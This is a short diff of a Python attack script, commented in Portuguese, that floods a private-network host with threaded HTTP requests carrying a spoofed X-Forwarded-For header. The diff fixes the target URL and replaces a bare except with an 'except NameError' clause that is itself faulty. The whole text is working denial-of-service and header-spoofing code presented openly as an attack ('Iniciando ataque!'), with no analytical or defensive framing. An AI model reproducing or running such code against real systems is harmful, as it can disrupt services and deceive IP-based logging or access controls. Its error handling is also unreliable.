@@ -1,7 +1,7 @@
 import requests
 import threading
 
-target = "172.20.1.2"
+target = "http://172.20.1.2"
 spoofed_ip = "172.20.1.3"
 
 def attack():
@@ -9,7 +9,8 @@ def attack():
         try:
             headers = {'X-Forwarded-For': spoofed_ip}
             requests.get(target, headers=headers)
-        except:
+        except NameError:
+            print("ERRO: ", NameError)
             pass
 
 print("Iniciando ataque!")
